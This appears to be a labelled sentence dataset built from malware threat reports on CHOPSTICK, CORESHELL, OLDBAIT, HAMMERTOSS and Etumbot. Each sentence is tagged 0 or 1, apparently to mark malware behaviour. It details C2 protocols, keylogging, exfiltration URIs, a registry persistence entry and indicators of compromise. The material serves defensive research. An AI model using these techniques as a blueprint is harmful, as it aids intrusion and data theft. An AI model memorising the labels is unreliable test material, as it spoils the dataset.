The command is identified by the NULL terminated UNICODE string '' OK '' ( O\x00\K\x00\x00\ x00 ) .	0
The command is Base64 encoded and immediately follows the '' OK '' string .	0
Figure 12 shows a sample CORESHELL command : The Base64 decoded string is : The following table contains a description of each field in the command message : When the above command '' 10 41 70 41 10 42 33… '' is decrypted using the key '' 01 01 01 01 01 01 01 01 '' the following command message is produced : The implant supports the following four command identifiers from the controller as seen in Table 8 .	0
The first byte of the command message specifies the command type and is immediately followed by the PE or shellcode to be executed .	0
In this example the command byte is 04 indicating the following bytes are shellcode .	0
If the command byte was 01 , 02 , or 03 the following bytes would be a DLL or EXE that would be written to disk and executed .	1
CHOPSTICK is a backdoor that uses a modularized , object-oriented framework written in C++ .	1
This framework allows for a diverse set of capabilities across malware variants sharing a common code base .	0
CHOPSTICK may communicate with external servers using SMTP or HTTP .	1
This appendix documents variants using HTTP communications .	0
The first time CHOPSTICK is executed , it may encrypt and store configuration data in the Registry key HKU\S-1-5-19Classes\Software\Microsoft\MediaPlayer\ { E6696105-E63E-4EF1-939E- 15DDD83B669A } \chnnl .	1
The user HKU\S-1-5-19 corresponds to the LOCALSERVICE account SID .	0
The configuration block is encrypted using RC4 encryption .	1
The key is a combination of a 50-byte static key and a four-byte salt value randomly generated at runtime .	0
The static key is derived from opcodes in the backdoor .	0
CHOPSTICK collects detailed information from the host including the Windows version , CPU architecture , Windows Firewall state , User Account Control ( UAC ) configuration settings on Windows Vista and above and Internet Explorer settings .	1
It also tests for the installation of specific security products ( Table 9 ) and applications ( Table 10 ) .	1
After collecting host information , CHOPSTICK creates a hidden file that may be named % ALLUSERSPROFILE % \edg6EF885E2.tmp for temporary storage and creates a Windows mailslot with the name '' checkmesv5555 '' .	1
Its usage of a Windows mailslot would potentially allow external binaries to write data to the '' checkmesv5555 '' mailslot , possibly allowing CHOPSTICK to encrypt and store output from other malware .	1
It creates a thread that records user activity on the host , capturing desktop screenshots in JPEG format , tracks current window focus , collects keystrokes , and scrapes window contents ( text , context menus , etc. ) .	1
User activity is captured once every 500 milliseconds and logged in an HTML-like format .	1
The thread writes user activity log messages to the '' checkmesv5555 '' mailslot in plain text .	1
CHOPSTICK reads messages from the mailslot , encrypts them using RC4 , and then stores the encrypted message in an edg6EF885E2.tmp temporary file .	1
The RC4 encryption used here also uses a 50- byte static key plus four-byte random salt value .	0
After approximately 60 seconds of execution time , CHOPSTICK begins communicating with one of its C2 servers over HTTP .	1
After sending an initial HTTP GET request it uploads the file contents of edg6EF885E2 . tmp to the C2 server using HTTP POST requests .	1
It does not wait for a response from the server to begin uploading .	0
Once the contents of edg6EF885E2.tmp are uploaded , CHOPSTICK deletes the file .	1
Figure 13 below contains an example of an HTTP POST request uploading a segment from edg6EF885E2.tmp .	1
CHOPSTICK uses a URL-safe Base64 encoding , using an alphabet that substitutes '' + '' and '' / '' for '' - '' and '' NN '' , respectively .	1
Each HTTP request contains multiple Base64 encoded URL parameters , however only one parameter contains information encoded by the malware ( '' ai= '' ) and the rest of the URL parameters appear to be randomly generated per request .	0
CHOPSTICK encrypts an 11-byte sequence in the '' ai= '' parameter .	1
The purpose of this parameter appears to be to uniquely identify the particular instance of the backdoor to the C2 server .	1
The Base64 encoded text of this parameter begins with a number of randomly generated alphabetical characters presumably intended to prevent people from Base64 decoding the whole string without some knowledge of how the malware family works .	0
The first four bytes of the message are an XOR key for the remainder of the data .	0
Once decrypted using the XOR key , an 11-byte sequence is revealed .	0
The first seven bytes are static , and are hard-coded in CHOPSTICK , while the last four bytes appear to be unique .	0
The message body of the POST request is also Base64 encoded .	1
This encoded string is also prefixed with random characters designed to break the output of a Base64 decode operation on the entire string .	0
The first 15 bytes of the decoded message body comprise another 11-byte sequence similar to the sequence stored in the '' ai= '' parameter as described above .	0
Decrypting these bytes yields another static seven-byte sequence , followed by four unique bytes .	0
The remainder of the message body consists of the RC4 encrypted data containing the HTML-formatted user activity log , edg6EF885E2.tmp .	0
After uploading edg6EF885E2.tmp , CHOPSTICK continues to query its C2 servers for commands using HTTP GET requests .	1
The malware contains code which allows it to load or memory-map external modules that export the following functions : SendRawPacket , GetRawPacket , InitializeExp , DestroyExp , IsActiveChannel , GetChannelInfo , SetChannelInfo , Run , GetModuleInfo , GiveMessage , and TakeMessage .	1
CHOPSTICK backdoors are compiled within a modularized development framework .	0
This means that two separate CHOPSTICK backdoors may contain vastly different functionality , depending on which modules were included at compile time .	0
The modules that are included in an instance of CHOPSTICK may be reported to the C2 server as part of POST messages .	1
Figure 14 includes an example from a CHOPSTICK v1 variant : To decode the POST content , the first step is to remove characters from the Base64 string ( the number of characters to remove may vary between different communication channels ) .	0
In the example from Figure 14 , the number of characters removed is seven .	0
Once these characters are removed the decoded ( but still encrypted ) text looks like this : The first two words ( '' 72 11 '' and '' fd 22 '' ) are checksums that are used to validate the message .	1
The next 4 bytes '' f8 dc 33 9e '' are a salt value that is appended to the end of an RC4 key .	0
Once decrypted , the message looks like the following : The strings '' V4MGNxZWlvcmhjOG9yZQ '' and '' = < < \xee '' are hardcoded in the implant .	0
The module information starts at offset 0x20 with the string '' 01 00 00 '' and is formatted as follows : The modules included in this CHOPSTICK v1 implant are : Our determination of a CHOPSTICK '' v1 '' versus '' v2 '' is based on the self-identification of the kernel ID and associated modules .	0
Compare the list of CHOPSTICK v1 modules in Table 12 with the list of modules in an example CHOPSTICK v2 variant in Table 13 : The kernel IDs 0x0001 and 0x0002 indicate different versions .	0
The corresponding modules in each backdoor also are consistently identified with 0x01 and 0x02 , respectively , in the second byte .	0
In both variants the modules with keystroke log , file system access , and command shell capabilities have the consistent identifiers 0x10 , 0x11 , and 0x13 , respectively , in the first byte .	0
This suggests that the first byte in the module ID identifies the module type whereas the second byte identifies the kernel version .	0
The kernel sends commands to each module using its module ID .	0
The commands that each module understands are likely consistent from build to build .	0
Table 14 and Table 15 show examples of commands that each module understands .	0
OLDBAIT is a credential harvester that installs itself in % ALLUSERPROFILE % \\Application Data\ Microsoft\MediaPlayer\updatewindws.exe .	1
There is a missing space in the MediaPlayer directory and the filename is missing the 'o ' character .	0
Both the internal strings and logic are obfuscated and are unpacked at startup .	1
Credentials for the following applications are collected : Both email and HTTP can be used to send out the collected credentials .	1
Sample HTTP traffic is displayed in Figure 15 .	0
OLDBAIT handles APIs very similarly to SOURFACE and EVILTOSS .	0
There is a setup routine that loads the imports into a table and all API calls reference an index to this table .	0
In SOURFACE and EVILTOSS the table is stored in a global variable while in OLDBAIT this table is allocated at runtime and a pointer is passed between functions .	0
T he Russian cyber threat groups that we monitor frequently design innovative ways to cover their tracks .	0
In early 2015 , we came across stealthy malware - which we call HAMMERTOSS - from an advanced persistent threat group that we suspect the Russian government sponsors .	0
We designate this group APT29 .	0
Using a variety of techniques - from creating an algorithim that generates daily Twitter handles to embedding pictures with commands - the developers behind HAMMERTOSS have devised a particularly effective tool .	0
APT29 tries to undermine the detection of the malware by adding layers of obfuscation and mimicking the behavior of legitimate users .	1
HAMMERTOSS uses Twitter , GitHub , and cloud storage services to relay commands and extract data from compromised networks .	0
Using a variety of techniques - from creating algorithms that generate daily Twitter handles to embedding pictures with commands - the developers behind HAMMERTOSS have devised a particularly effective tool .	0
HAMMERTOSS works by .	0
While none of these tactics are new , the combination of these techniques piqued our interest .	0
KALININGRAD TIME MOSCOW TIME SAMARA TIME YEKATERINBURG TIME OMSK TIME KRASNOYARSK TIME IRKUTSK TIME YAKUTSK TIME VLADIVOSTOK TIME SREDNEKOLYMSK TIME KAMCHATKA TIME ( UTC + 02/MSK-1 ) ( UTC + 03/MSK ) ( UTC + 04/MSK+1 ) ( UTC + 05/MSK+2 ) ( UTC + 06/MSK+3 ) ( UTC + 07/MSK+4 ) ( UTC + 08/MSK+5 ) ( UTC + 09/MSK+6 ) ( UTC + 10/MSK+7 ) ( UTC + 11/MSK+8 ) ( UTC + 12/MSK+9 ) APT29 has been operating in its current form since at least late 2014 .	0
We suspect the Russian government sponsors the group because of the organizations it targets and the data it steals .	0
Additionally , APT29 appeared to cease operations on Russian holidays , and their work hours seem to to align with the UTC + 3 time zone , which contains cities such as Moscow and St.	0
Petersburg .	0
While other APT groups try to cover their tracks to thwart investigators , very few groups show the same discipline and consistency .	0
Similarly , few groups display the ability to adapt to network defenders ' attempts to mitigate its activity or remove it from victim networks .	0
For example , APT29 almost always uses anti - forensic techniques , and they monitor victim remediation efforts to subvert them .	0
Likewise , the group appears to almost solely uses compromised servers for CnC to enhance the security of its operations and maintains a rapid development cycle for its malware by quickly modifying tools to undermine detection .	1
These aspects make APT29 one of the most capable APT groups that we track .	0
5 W e first identified HAMMERTOSS in early 2015 .	0
APT29 likely used HAMMERTOSS as a backup for their two primary backdoors to execute commands and maintain access if the group 's principal tools were discovered .	0
We have identified two HAMMERTOSS variants that give APT29 alternative ways to communicate with the malware .	0
The developer appears to name these variants uploader and tDiscoverer.1 Both variants are written in the C # programming language .	0
Each variant uses different methods to acquire CnC instructions , either by directly accessing a hard - coded website or accessing Twitter as an intermediary .	1
We will focus on tDiscoverer in this report .	0
Five Stages of HAMMERTOSS We have broken down the malware communication process into five stages to explain how the tool operates , receives instructions , and extracts information from victim networks .	0
The stages include information on what APT29 does outside of the compromised network to communicate with HAMMERTOSS and a brief assessment of the tool 's ability to mask its activity .	0
6 < heaading > STAGE 1 : < /heading > The Communication Process Begins with Twitter H AMMERTOSS first looks for instructions on Twitter .	0
The malware contains an algorithm that generates a daily Twitter handle , which is an account user ID .	0
To create the handles , the algorithm employs a basename , such as " Bob , " and appends and prepends three CRC32 values based on the date .	0
For example , " 1abBob52b " would have the URL : hxxps://twitter.com/1abBob52b .	0
Each HAMMERTOSS sample will create a different Twitter handle each day .	0
APT29 knows the algorithm used to generate the handles and chooses to register a Twitter handle and post obfuscated instructions to the handle 's URL before the malware attempts to query it .	0
If a particular day 's handle is not registered and the URL for that day is not found , HAMMERTOSS will wait until the next day to attempt to communicate with another handle .	0
APT29 typically configures HAMMERTOSS to communicate within certain restrictions , such as only checking the Twitter handle on weekdays or after a specified start date .	0
This allows the malware to blend in to " normal " traffic during the victim 's work week or to remain dormant for a period of time before activating .	0
7 Tweeting a URL , Minimum File Size of an Image , and Part of an Encryption Key I f APT29 has registered that day 's Twitter handle , they will tweet a URL and a hashtag .	0
The URL directs HAMMERTOSS to a webpage containing an image or images .	0
The hashtag provides a number representing a location within the image file and characters for appending to an encryption key to decrypt instructions within the image .	0
In the mockup of a HAMMERTOSS tweet in Figure 2 , the hashtag was # 101docto , indicating that the encrypted data begins at an offset of 101 bytes into the image file , and the characters docto should be added to the encryption key to decrypt the data .	0
Using Twitter as an intermediary to deliver the second - stage CnC to HAMERTOSS allows APT29 to dynamically direct the tool .	1
In Figure 3 is a sample of the HAMMERTOSS tDiscoverer variant and a corresponding snapshot of a Twitter account page from one of its generated handles .	0
At the time of publication , a publicly available HAMMERTOSS sample had only five generic detections in VirusTotal .	0
The Twitter account was active and contained a link to a website .	0
HIDING AMONG UNREGISTERED TWITTER ACCOUNTS H AMMERTOSS uses an algorithm to generate hundreds of Twitter handles annually for potential CnC.	0
Many of these are unregistered , as APT29 chooses to register a particular day 's handle as needed and ahead of an anticipated HAMMERTOSS beacon .	0
This small number of registered accounts allows the group to maintain a small footprint .	0
Other tools use Twitter to relay instructions , including:2 MiniDuke behaves similarly to HAMMERTOSS by not only using Twitter for CnC , but also by downloading image files containing encrypted , appended content .	1
9 Visiting GitHub to Download an Image H AMMERTOSS then uses the InternetExplorer .	0
Application COM Object to visit the URL specified in a tweet .	0
We have observed URLs lead to specific GitHub accounts or compromised websites .	0
We will use Github for the next part in our example .	0
Once HAMMERTOSS obtains the GitHub URL from its daily Twitter account , it visits the URL and downloads the contents of the page , including any image files .	0
APT29 Employs Basic Steganography H AMMERTOSS downloads the contents of the website to Internet Explorer 's browser cache and searches the cache for any images at least as large as the offset specified in the tweet from Stage 2 .	0
While the image appears normal , it actually contains steganographic data .	0
Steganography is the practice of concealing a message , image , or file within another message , image , or file .	0
In this case , the image contains appended and encrypted data that HAMMERTOSS will decrypt and execute .	0
The data may include commands or login credentials to upload a victim 's data to a cloud storage service .	1
HAMMERTOSS locates the encrypted data at the offset specified in the tweet in Stage 2 .	0
It decrypts the data using a key comprised of hard - coded data from the malware binary appended with the characters from the tweet .	0
APT29 ADDING STEGANOGRAPHY AS ANOTHER LAYER OF OBFUSCATION We have observed only a few APT groups using steganography .	0
HAMMERTOSS uses steganography by appending data to an image file after the image 's end of file marker .	0
This technique would be readily detectable if someone was checking for it .	0
However , the appended data is encrypted , so even if detected , the investigator would be unable to decrypt the data without key material from two sources : the malware binary and the current tweet .	0
the group ensures that if network defenders discover the images , the defenders still require the malware sample , corresponding Twitter handle , and tweet with the additional key material to decrypt the tool 's instructions .	0
All of the samples we have observed have used Indicative of APT29 's discipline , different encryption keys to decrypt the appended content .	0
Executing Commands and Uploading Victim Data APT29 's operator creates the cloud storage account and can obtain the victim 's data from the cloud storage service .	0
T he encrypted data in the image may include instructions to execute commands via PowerShell , execute a direct command or file , or save an executable to disk and execute it .	1
In several cases , the commands directed HAMMERTOSS to upload information from victim networks to accounts on cloud storage services using login credentials received in Stage 4 .	1
In our GitHub example , the decrypted data instructed the backdoor to obtain a list of running tasks reconnaissance on the victim network - and upload it to a specific account on a cloud storage service using the login credentials .	1
APT29 can then easily obtain the extracted information from the cloud storage service at their convenience .	0
Difficulty Identifying Accounts , Discerning Legitimate and Malicious Traffic , and Locating the Payload H AMMERTOSS undermines network defenders ' ability to identify Twitter accounts used for CnC , discern malicious network traffic from legitimate activity , and locate the malicious payloads downloaded by the malware .	0
APT29 : AN ADAPTIVE AND DISCIPLINED THREAT GROUP HAMMERTOSS illustrates APT29 's ability to adapt quickly during operations to avoid detection and removal .	1
For example , if an organization blocks access to GitHub , APT29 could easily redirect HAMMERTOSS to download an image with encrypted instructions from another website .	0
Similarly , if an organization starts monitoring Twitter activity on their network , APT29 could easily switch to using the Uploader variant of HAMMERTOSS , which does not use Twitter and communicates directly to a specified URL .	0
If an organization identifies the handle generation algorithm and attempts to research old Twitter accounts , tweets , or secondary URLs , APT29 could easily delete previously used accounts or the locations where images were stored .	0
While each technique in HAMMERTOSS is not new , APT29 has combined them into a single piece of malware .	0
Individually , each technique offers some degree of obfuscation for the threat group 's activity .	0
In combination , these techniques make it particularly hard to identify HAMMERTOSS or spot malicious network traffic ; determine the nature and purpose of the binary ; discern the malware 's CnC method and predict its CnC accounts ; capture and decode second - stage CnC information ; and pinpoint and decrypt the image files containing malware commands .	0
This makes HAMMERTOSS a powerful backdoor at the disposal of one of the most capable threat groups we have observed .	0
To download this or other FireEye Threat Intelligence reports , visit : https://www.fireeye.com/reports.html FireEye , Inc.	0
| 1440 McCarthy Blvd .	0
Milpitas , CA 95035 | 408.321.6300 | 877.FIREEYE ( 347.3393 ) | info@fireeye.com | www.fireeye.com 2015 FireEye , Inc.	0
All rights reserved .	0
FireEye is a registered trademark of FireEye , Inc.	0
All other brands , products , or service names are or may be trademarks or service marks of their respective owners .	0
SP.APT29.EN - US.072015	0
Arbor Threat Intelligence Brief 2014 - 07 ASERT Threat Intelligence , June 2014 Etumbot is a backdoor used in targeted attacks since at least March 2011 .	0
Although previous research has covered a related family , IXESHE , little has been discussed regarding Etumbot 's capabilities .	0
ASERT has observed several Etumbot samples using decoy documents involving Taiwanese and Japanese topics of interest , indicating the malware is used in ongoing , targeted campaigns .	0
This report will provide information on the capabilities of Etumbot and associated campaign activity .	0
Etumbot is a backdoor malware that has been associated with a Chinese threat actor group alternatively known as " Numbered Panda " , APT12 , DYNCALC / CALC Team , and IXESHE .	0
Targeted campaigns attributed to this group include attacks on media , technology companies , and governments .	0
IXESHE / Numbered Panda is known for using screen saver files ( .scr ) , a technique repeated with the Etumbot malware .	0
[ 1 ] A previous campaign using IXESHE malware was highlighted in 2012 ; the group used targeted emails with malicious PDF attachments to compromise East Asian governments , Taiwanese electronics manufacturers , and a telecommunications company .	1
The group has reportedly been active since at least July 2009 .	0
[ 2 ] Etumbot has also been referred to as Exploz [ 3 ] and Specfix .	0
The variety of names for this malware could lead to some confusion about the actual threat .	0
ASERT has associated Etumbot with IXESHE , and therefore Numbered Panda , based on similar system and network artifacts that are common between the malware families .	0
For example , both malware families have been seen using the same ka4281x3.log and kb71271.log files , both families have been observed calling back to the same Command & Control servers and have been used to target similar victim populations with similar attack methodologies .	1
Etumbot has two primary components .	0
The first is a dropper which contains the backdoor binary ( the second component ) and the distraction file .	1
Stage one is likely delivered via spear phish using an archive file extension such as .7z to deliver executable content .	0
Stage one has been seen to leverage the Unicode Right to Left Override trick combined with convincing icons for various types of PDFs or Microsoft Office documents to convince the user to click and therefore execute the malware , which then runs the backdoor and displays the distraction file .	0
As with the IXESHE malware , Etumbot has been observed dropping documents of interest to a Taiwanese and Japanese target population .	0
To profile the techniques and capabilities of Etumbot , we will analyze an Etumbot dropper with MD5 ff5a7a610746ab5492cc6ab284138852 and a compile date of March 4 , 2014 .	0
When executed , the dropper loads up a resource named " BINARY " from the resource section then creates the directory C:\Documents and Settings\User\Application Data\JAVA , then creates a temporary file C:\DOCUME~1\User\LOCALS~1\Temp\ka4281x3.log then creates C:\Documents and Settings\User\Application Data\JAVA\JavaSvc.exe from the aforementioned BINARY resource .	1
This file , JavaSvc.exe , is the backdoor component ( MD5 82d4850a02375a7447d2d0381b642a72 ) .	0
JavaSvc.exe is executed with CreateProcessInternalW.	0
The backdoor component of the malware ( named here as JavaSvc.exe ) is now running .	0
It is interesting to note that versions of the IXESHE malware also used JavaSvc.exe as a filename .	0
Most Etumbot samples observed by ASERT drop decoy documents ( PDFs , Word Documents , and Excel Spreadsheets ) written in Traditional Chinese and usually pertaining to Cross - Strait or Taiwanese Government interests .	1
Several decoy files contain details on upcoming conferences in Taiwan .	0
Etumbot appears to be sent to targets via spear phishing emails as an archive ; ASERT has observed .7z and .rar formats being used to presumably deliver the Etumbot installer .	0
The archive filename will have a topic most likely of interest to the victim .	0
At least one identified malware sample ( 75193fc10145931ec0788d7c88fc8832 , compiled in March 2014 ) uses a password - protected .7z to deliver the Etumbot installer .	0
It is most likely that the spear phish email contained the password .	0
With the correct password , the victim has access to the dropper inside the archive .	0
This archive most likely included the installer d444be30d2773b23de38ead1f2c6d117 , as the filenames match ( 1030522 新 機關籌備小組清單.7z and 1030522 新機關籌備小組清單 rcs . DOC ) .	0
1030522 is a date ( May 22 , 2014 ) from the Minguo calendar , which is unique to Taiwan .	0
The calendar is based on the establishment of the rd Republic of China in 1911 .	0
2014 is therefore the " 103 " year of the ROC .	0
The installer is a .scr binary posing as a Word Document .	0
This dropper drops a decoy document and the backdoor , named sysupdate.exe in this instance .	0
Right - to - Left Override After the files are extracted from the archive , the filenames of Etumbot installers make use of the right - to - left override ( RTLO ) trick in an attempt to trick users into clicking on the installer .	0
The RTLO technique is a simple way for malware writers to disguise names of malicious files .	0
A hidden Unicode character in the filename will reverse the order of the characters that follow it , so that a .scr binary file appears to be a .xls document , for example .	0
Threat actors using this trick have been well documented since at least 2009 .	0
[ 4- 5 ] One way to avoid this trick in Windows is to set the " Change your view " level to " Content " .	0
[ 6 ] Below are some of the names of Etumbot installers using RTLO successfully .	0
As the backdoor executes from our previous example , C:\DOCUME~1\User\LOCALS~1\Temp\ kb71271.log is created and contains the following registry file to make the malware persistent .	1
[ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run ] " JavaSvc"="C:\\Documents and Settings\\User\\Application Data\\JAVA\\JavaSvc.exe " The dropper then calls regedit with kb71271.log as a parameter to modify the registry .	1
kb71271.log is then deleted .	1
These temp files appear to be static and used across multiple samples of Etumbot and IXESHE .	0
Various other samples were found using this same naming scheme .	0
Next , C:\DOCUME~1\User\LOCALS~1\Temp\ka4281x3.log is created , filled with contents of the bait / distraction file , and then copied to C:\DOCUME~1\User\LOCALS~1\Temp\~t3fcj1.doc , which is then opened .	1
If Word is n't installed , then notepad will open the file instead .	0
The ka4281x3.log file is then deleted .	1
Returning to the first sample , once the dropper ( ff5a7a610746ab5492cc6ab284138852 ) installs the Etumbot backdoor ( 82d4850a02375a7447d2d0381b642a72 ) , an initial HTTP beacon is sent to the Command & Control server that requests an RC4 encryption key .	1
The beacon takes the form of a GET request to /home / index.asp?typeid = N where N is a randomly selected odd number between 1 and 13 .	0
If the C&C is online , the decoded response payload will contain the RC4 key that is used to encrypt subsequent communication .	1
If the C&C does not send a valid response , the bot will re - send the initial request every 45 seconds .	0
While the user - agent may appear to be legitimate , it only occurred 39 times in a corpus of over 61 million HTTP requests .	0
Due to the possibility of this User - Agent appearing in legitimate traffic , other indicators – such as the additional fake Referer value of http://www.google.com should be present before compromise is assumed .	0
All of the headers in the HTTP request are hard - coded in both order and value , so they may be used to provide additional indicators of compromise .	0
If the C&C is online and responds to the beacon , then the RC4 key is delivered to the bot in a string of base64 encoded characters .	1
Etumbot uses a url - safe base64 alphabet , i.e. , any characters that would require URL - encoding are replaced .	0
Usage of base64 is a technique consistent with previous analysis done on IXESHE malware .	0
[ 2,7 ] In the case of Base64 , the " / " and " = " characters are replaced with " _ " and " - " respectively .	0
The payload from the C&C contains an 8-byte command code in little - endian format , followed by a null - terminated string argument if the command requires it .	0
In the case of the initial beacon response , the RC4 key is located after the command code and has been observed to be e65wb24n5 for all live C&C 's that ASERT has analyzed .	0
An example of this initial beacon and delivery of RC4 key is as follows .	0
The RC4 key can be obtained from the C&C response with the following python .	0
While a payload of 1080 bytes is sent back , the majority appears to be random padding .	0
Once the bot has received the encryption key , the bot sends a registration callback to the C&C /image/<encrypted data>.jpg containing the encrypted values of system information to include the NetBIOS name of the system , user name , IP address , if the system is using a proxy ( Yes / No ) , and a numeric value which may be some type of campaign code .	1
IXESHE malware has also been observed using a unique campaign code that is delivered back to the C&C.	0
[ 7 ] Etumbot discovers the proxy settings of the local machine .	1
If a proxy is defined , communications to the C&C bypass the proxy and go directly to the Internet .	0
Environments with system - defined proxies wo n't get this activity in proxy logs , however transparent proxies may see this activity .	0
A contrived example of this registration string generated by the Etumbot backdoor prior to encryption is as follows .	0
WINXPBOX|johnsmith|10.0.1.15|No Proxy|05147| Once the bot has registered with the C&C , it will send periodic pings to ask for new commands to execute .	1
The URI for the ping requests is /history/<encrypted NetBIOS name>.asp , where encrypted NetBIOS name is the url - safe base64 encoding of the rc4-encrypted NetBIOS name .	0
The first eight bytes of C&C responses to the bot include the command , and the second eight bytes contain an ASCII string that is parsed .	0
In the event of a file download , file upload , or command execution , the second eight bytes contain the filename or command to be executed .	0
The parsing function inside the binary reveals at least five commands .	0
ETUM_CMD_EXEC provides the capability for the attacker to run any command on the compromised hosts .	0
Both stdout and stderr from the command are redirected to a pipe and are then relayed back to the C&C using a separate thread that spawned during initialization .	0
In the event of a process creation or hang error , an HTTP transaction to /tech / s.asp / m=<message > is sent to the C&C , where < message > contains a create process error statement " CreateProcess Error : % d " or a message that states " Process Do not exit in 10 second , so i Kill it ! " .	0
Some samples of droppers have been observed using the string " Process Do not cunzai in 10 second , so i Kill it ! " .	0
The word " cunzai " is likely the pinyin ( romanization ) for the Mandarin word ' exist ' .	0
ETUM_CMD_PUTFILE provides the capability for files to be placed on local system from the C&C.	0
The file upload is accomplished by sending a request to /docs / name=<data > and the C&C is expected to respond with the full contents of the file as the response payload .	0
A success or failure status message is relayed via a call to /tech / s.asp?m=<encrypted status message > with various reasons for failure potentially being relayed .	0
ETUM_CMD_READFILE allows any file from the compromised system to be uploaded to the C&C.	0
When a READFILE command is received from the C&C , the bot makes an initial call to /manage / asp / item.asp?id=<encrypted computer name>&&mux=<encrypted total file size > and checks for the presence of " I 'm Ready " in the response from the C&C.	1
Data from the file is read in 2000 byte chunks , RC4 encrypted and then url - safe base64 encoded .	0
The data is sent back to the C&C via the URI /article/30441/Review.asp?id=<encoded computer name>&&date=<file chunk data > .	1
The bot expects a message of " OK " from the C&C after each response is sent and will terminate the upload and send an error message to the C&C in the case it is not seen .	1
A success or failure message is sent via the /tech / s.asp?m=<encrypted status message > to complete or terminate the upload .	0
ETUM_CMD_SLEEP puts the bot into a dormant state for a period of time .	0
When a bot receives the sleep command , it will relay the message , " I will sleep % d minutes ! " via a call to /tech / s.asp?m=<encrypted message>.	0
ETUM_CMD_UNINSTALL deletes the binary and terminates the process with no additional communication to the C&C.	0
Etumbot uses a technique to load strings into memory that has been called " byte strings " and also " string stacking " whereby character values are loaded into a specific memory location one byte at a time .	1
Assuming the string values do not change frequently , these byte strings can make for meaningful detection capabilities , such as discovering an unusual combination of characters ( to include typos , unique or odd syntax ) being loaded into memory that creates a unique fingerprint for the malware activity that can be used as part of a yara rule or other detection mechanism .	0
The byte string technique has been observed in various Chinese APT malware , including Gh0st RAT , IXESHE malware , Etumbot and others .	0
ASERT has provided an IDApython script that will provide for cleaner analysis of such strings as well as a corresponding blog entry that describes the obfuscation technique and code .	0
[ 8 - 9 ] The output of running find_byte_strings.py on an Etumbot backdoor shows the string " I 'm Ready " which is involved in file transfer routines .	0
The first screenshot shows the default hex byte values that are MOVed into offsets from EBP , and the second screenshot shows those same characters after translation to string values .	0
Two additional screenshots provide insight into all of the strings discovered .	0
The byte string technique has also been observed in other malware , so its presence alone does not specifically indicate the activities of Chinese threat actors .	0
An interesting artifact occasionally observed during analysis is the presence of a numeric value just after an IP address used as a C&C.	0
The placement of this number after a colon suggests the use of a port value , however such a port value is too high to be valid .	0
An example of this taken from an Etumbot sample performing an initial beacon is as follows .	0
11 Most instances of Etumbot that were analyzed connect directly to an IP address with the IP address hardcoded in the binary .	0
These C&C 's were obtained from analyzing malware samples compiled over a period of several years .	0
A number of these C&C IP addresses are also used by IXESHE - related malware , which seems to indicate that Etumbot is often used in tandem with IXESHE .	0
The domain finance[.]yesplusno[.]com and IP address 211[.]53.164.152 was also used by a variety of IXESHE samples , for instance .	0
The registrant for the domain yesplusno[.]com is listed as " alice yoker " wit the email address " chuni_fan@sina.com " .	0
Other domains registered in this name have also been used as C&C for IXESHE .	0
securezone[.]yesplusno[.]com [ 10 ] prishmobile[.]googlesale[.]net yahoopush[.]googlesale[.]net The IP address 98.188.111.244 has also been used as a C&C for multiple IXESHE samples , beginning in at least March 2013 and observed as recently as March 2014 with an Etumbot sample .	1
This is the IP address for what appears to be a legitimate website for a school in Taiwan : intro.sunnyschool.com.tw .	0
Note that if HTran or other connection bouncer is used , the C&C may be a legitimate site that was simply compromised and used to direct traffic elsewhere .	0
Indicators suggest that HTran , a connection bouncer , is being used in some cases such as on the C&C contacted by malware sample MD5 : 1ce47f76fca26b94b0b1d74610a734a4 ( compilation date March 12 , 2014 ) .	0
The presence of HTran is based on the following response string HTran is also called " HUC Packet Transmit Tool " , developed by a member of the Honker Union of China , a hacker group ; the source code for the program is available online .	0
[ 11 ] HTran is designed to redirect TCP traffic intended for one host to another , and has been used by IXESHE malware previously .	0
[ 2 ] Researchers at SecureWorks determined some years back that HTran would deliver the IP address of the final destination server if the final server were down or unreachable .	0
The code in use here has been modified to not reveal such information .	0
Organizations properly positioned with netflow or other traffic analysis capabilities may be able to locate upstream servers from HTran nodes that operate as the initial tier of C&C.	0
Htran activity can be detected with the following signature .	0
ET CURRENT_EVENTS HTran / SensLiceld . A response to infected host The import hash for the sample observed connecting to an Htran bouncer is a9059c354e5025dfe4f1c0b8b57e4f62 which links to other Etumbot samples compiled with Microsoft Visual C++ 5.0 in a similar March 2014 timeframe .	0
• 4c703a8cfeded7f889872a86fb7c70cf 2014 - 03 - 24 • ff5a7a610746ab5492cc6ab284138852 2014 - 03 - 04 The following samples have been identified by ASERT as Etumbot malware .	0
The first identified sample has a compilation date of March 2011 , while the most recent was compiled in May 2014 .	0
Many droppers / installers contain Etumbot or , alternatively , IXESHE - related backdoors .	0
Most of the documents dropped with Etumbot are written in traditional Chinese .	0
Traditional Chinese ( versus simplified Chinese used in mainland China ) is most widely used in Taiwan .	0
While other areas do make use of traditional Chinese ( Hong Kong , Macau ) , the topics of the decoy documents strongly suggest that Taiwanese entities are the targets for many Etumbot samples .	0
A recent increase in Etumbot samples with configuration dates of 2014 seems to indicate that the Numbered Panda / IXESHE group has increased activity lately or has begun using Etumbot more widely in targeted campaigns .	0
